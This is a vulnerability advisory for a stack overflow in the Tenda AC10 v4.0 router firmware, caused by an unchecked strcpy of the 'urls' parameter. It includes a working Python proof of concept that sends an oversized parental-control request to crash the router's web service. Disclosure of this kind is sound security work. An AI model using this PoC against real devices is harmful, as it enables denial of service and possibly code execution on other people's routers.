# Tenda Router Vulnerability on get_parentControl_list_Info function

> vendor:Tenda
>
> product:AC10
>
> version:v4.0 V16.03.10.13 
>
> type:Stack Overflow  

## Vulnerability Description

Tenda AC10V4.0 V16.03.10.13 were discovered to contain a stack overflow via the `urls` parameter in the `get_parentControl_list_Info` function.

## Vulnerability Details

In function  `get_parentControl_list_Info`  line 34, it reads in a user-provided parameter `urls`, and the variable is passed to the function `strcpy` in line 52 without any length check, which may lead to overflow of the stack-based buffer.  As a result, by requesting the page, an attacker can easily execute a **denial of service** attack or **remote code execution**.

![image-20231004162256517](assets/get_parentControl_list_Info_code.png)

## Recurring vulnerabilities and POC

Run this poc and you will see the service crash. The service will keep loading until it crashes.

```
import requests

ip = '192.168.0.1'
headers = {
    'Host': ip,
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'close',
}

urls = "w" * 1000
data = {
    'deviceId': '10:11:11:11:11:16',
    'deviceName': 'deviceNAME6',
    'enable': '1',
    'time': '19:00-20:00',
    'url_enable': '1',
    'urls': urls,
    'day': '1,1,1,1,1,1,1',
    'limit_type': '0',
}

response = requests.post(
   f'http://{ip}/goform/saveParentControlInfo',
    headers=headers,
    data=data,
    verify=False,
)
```

![image-20231003204540135](assets/crash1.png)

![image-20231004110508234](assets/crash2.png)

